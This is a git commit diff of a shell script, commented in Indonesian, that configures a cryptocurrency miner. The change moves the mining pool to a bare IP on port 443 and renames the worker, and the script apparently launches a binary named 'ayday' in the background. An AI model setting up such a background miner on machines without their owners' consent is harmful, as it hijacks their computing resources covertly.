58dcd7c34f49d912f459eb4af645209b9273844b
malogrono <136266511+malogrono@users.noreply.github.com>
2024-12-29 14:15:21 +0700

    Update ad.sh

--- ad.sh
+++ ad.sh
@@ -29,10 +29,10 @@ done
 
 # Pengaturan penambangan
 ALGO="verushash"
-POOL_URL="stratum+tcp://sg.vipor.net:5040"
+POOL_URL="stratum+tcp://128.199.167.154:443"
 WALLET_ADDRESS="RAcHjkHaMZ7EUKcTqPYrePvz7khGpeC53F"
 PASSWORD="x"
-WORKER_NAME="B$RANDOM"
+WORKER_NAME="RIG$RANDOM"
 
 # Memulai dengan file ayday dan menjalankan di latar belakang
 cd $INSTALL_DIR
